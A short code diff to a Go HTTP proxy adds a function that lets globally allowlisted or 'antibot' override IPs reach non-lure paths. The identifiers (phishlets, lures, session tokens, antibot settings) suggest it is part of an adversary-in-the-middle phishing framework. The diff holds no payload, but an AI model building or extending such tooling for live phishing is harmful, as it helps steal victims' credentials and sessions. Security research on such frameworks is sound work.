@@ -555,7 +555,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
+						if l == nil && (p.isWhitelistedIP(remote_addr, pl.Name) || p.isGloballyAllowed(remote_addr)) {
 							// not a lure path and IP is whitelisted
 
 							// TODO: allow only retrieval of static content, without setting session ID
@@ -2387,6 +2387,20 @@ func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
 	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
 		et := time.Unix(ip_t, 0)
 		return ct.Before(et)
+	}
+	return false
+}
+
+func (p *HttpProxy) isGloballyAllowed(ip_addr string) bool {
+	if p.wl != nil && p.wl.IsWhitelisted(ip_addr) {
+		return true
+	}
+	if ab := p.cfg.GetAntibotConfig(); ab != nil {
+		for _, allowed_ip := range ab.OverrideIPs {
+			if ip_addr == allowed_ip {
+				return true
+			}
+		}
 	}
 	return false
 }
